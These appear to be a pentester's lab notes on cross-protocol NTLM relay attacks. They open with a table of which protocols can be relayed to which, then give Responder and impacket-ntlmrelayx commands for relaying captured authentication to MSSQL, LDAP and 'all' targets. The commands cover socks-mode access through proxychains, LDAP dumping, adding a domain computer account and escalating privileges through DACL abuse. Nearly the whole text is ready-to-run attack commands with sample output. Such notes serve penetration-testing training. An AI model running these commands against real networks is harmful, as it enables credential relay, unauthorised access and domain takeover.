It is possible to perform what is so called "Cross-protocoll" which basically means that the incoming spoofed request might be on a specific protocoll and it can be relayed to a totally another one.
You can check this table for guidance:

|**Relay Authentication From**|**Relay Authentication Over**|**Cross-protocol?**|
|:--|:--|:--|
|`HTTP`(`S`)|`HTTP`(`S`)|`No`|
|`HTTP`(`S`)|`IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMBv/1/2/3` \| `SMTP`|`Yes`|
|`SMBv/1/2/3`|`SMBv/1/2/3`|`No`|
|`SMBv/1/2/3`|`HTTP`(`S`) \| `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMTP`|`Yes`|
|`WCF`|`HTTP`(`S`) \| `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMBv/1/2/3` \| `SMTP`|`Yes`|

## Relay over MSSQL
You can do a NTLM relay over MSSQL resources so as usual you want to populate you target list with all the IP that holds a **SMB signing=OFF.**
As usual, we must disable SMB spoofing from Responder's configuration as setup a listener.
```shell-session
sudo responder -I ens192
```
Setup the ntlmrelay in socks mode.
```shell-session
sudo impacket-ntlmrelayx mssql://172.16.117.60 -smb2support -socks
```
After a while you should fetch a relayed request to the internal proxy socks server.
```shell-session
tlmrelayx> socks

Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
MSSQL     172.16.117.60  INLANEFREIGHT/NPORTS  N/A          1433
```
And take your attack further to the default socks over port **1080/TCP**.
```shell-session
proxychains -q impacket-mssqlclient INLANEFREIGHT/nports@172.16.117.60 -windows-auth -no-pass
```

## Relay over LDAP
Here we must disable both **SMB** & **HTTP** spoofing from Responder config. Next setup the listener.
```
sudo responder.py -I ens192
```
Next we setup the ntlmrelayx to listen over the ldap protocoll over DC.
```shell-session
sudo impacket-ntlmrelayx -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump
```
**Remeber:** if might give some error this is because the transition **smb2ldap** in that case might be good idea to check for this CVE https://github.com/fox-it/cve-2019-1040-scanner/tree/master
We can also add a computer to domain  via relayed socks connection.
```shell-session
sudo impacket-ntlmrelayx -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
```
Or even abusing DACLs via easy command.
```shell-session
sudo impacket-ntlmrelayx -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
```

## Relay over ALL
In this last examples we can see how we can abuse to check all the rest. The attack is same as the other via socks/interactive option the only difference is that the target list will look like something similar.
```shell-session
all://172.16.117.50
all://172.16.117.60
```
Unfortunately this inquires that we must disable all the services from beeing spoofed in Responder.conf file by setting them to "OFF".
